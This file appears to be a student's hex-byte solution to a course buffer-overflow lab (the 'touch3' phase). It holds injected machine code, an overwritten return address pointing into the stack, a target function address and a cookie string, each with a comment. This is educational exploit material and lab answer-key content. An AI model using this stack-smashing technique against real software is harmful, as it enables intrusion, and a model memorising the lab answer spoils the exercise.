/* b0 dc 61 55 00 00 00 00 */ /* should be the ADDR of sval? no need */
00 00 00 00 00 00 00 00
48 c7 c7 b0 dc 61 55 c3 /* should be the exploit code */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00

/* below is the position of original returning ADDR */
80 dc 61 55 00 00 00 00 /* the address of exploit code - start of rsp */
fa 18 40 00 00 00 00 00 /* the address of touch3() */
35 39 62 39 39 37 66 61 /* put string repr here */
00 00 00 00 00 00 00 00 /* trailing \0 */
